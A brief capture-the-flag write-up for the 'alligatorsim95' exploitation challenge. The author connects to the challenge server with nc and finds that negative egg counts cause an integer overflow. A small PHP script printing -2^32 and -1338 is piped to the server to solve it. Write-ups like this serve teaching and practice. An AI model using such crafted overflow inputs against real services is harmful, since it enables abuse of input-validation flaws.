# Exploitation 50 alligatorsim95

We had to `nc` to the server which gave us some nice ASCII art:

    nc 4.31.182.242 9000
    
                  .-._   _ _ _ _ _ _ _ _
       .-''-.__.-'00  '-' ' ' ' ' ' ' ' '-.
      '.___ '    .   .--_'-' '-' '-' _'-' '._
       V: V 'vv-'   '_   '.       .'  _..' '.'.
         '=.____.=_.--'   :_.__.__:_   '.   : :
                 (((____.-'        '-.  /   : :
       snd                         (((-' .' /
                                 _____..'  .'
                                '-._____.-'
      -> welcome to alligatorsim95!
    
    -> u r... AN ALLIGATOR!!
    .. simulating alligator lifecycle ..
    .. simulating alligator throwing physics..
    -> you got 1337 eggz in ur nest, how many you gonna lay alligator??

We could increase the eggs in our nest by passing a value. I then thought maybe we could pass a negative value. It turned out to be possible: the eggs in the nest decreased. I then tried a huge negative number: `-10000000000`. I discovered there was an integer overflow. I quickly wrote a simple php script:

    <?php
    
    echo "-" . pow(2, 32) . "\n" .
         "-1338\n";

Pwning with a simple command `php exp_eggs.php | nc 4.31.182.242 9000`:

![php pwning](files/overflow.png?raw=true)